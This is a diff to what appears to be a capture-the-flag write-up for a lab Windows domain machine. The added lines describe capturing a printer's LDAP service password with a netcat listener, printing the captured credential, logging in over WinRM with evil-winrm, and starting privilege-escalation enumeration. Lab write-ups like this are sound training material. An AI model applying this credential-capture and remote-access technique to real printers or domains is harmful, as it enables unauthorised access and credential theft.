@@ -61,4 +61,12 @@ text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera
 Going to the http, I found a printer. Going to the settings I came across a place to update the IP/port/user, but the password but encrypted with asterisks.
 So by running a `nc -lvnp 389` I was able to send the password to my machine.
 `svc-printer:1edFg43012!!`
-Now I can enumerate the domain.jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+Now I can enumerate the domain.
+Running `evil-winrm -u svc-printer -p 1edFg43012!!`
+
+With that the flag is in the Desktop like normal
+
+# Priv Escalation
+`net user svc-printer` 
+With this command we can see all the groups it is apart of.
+
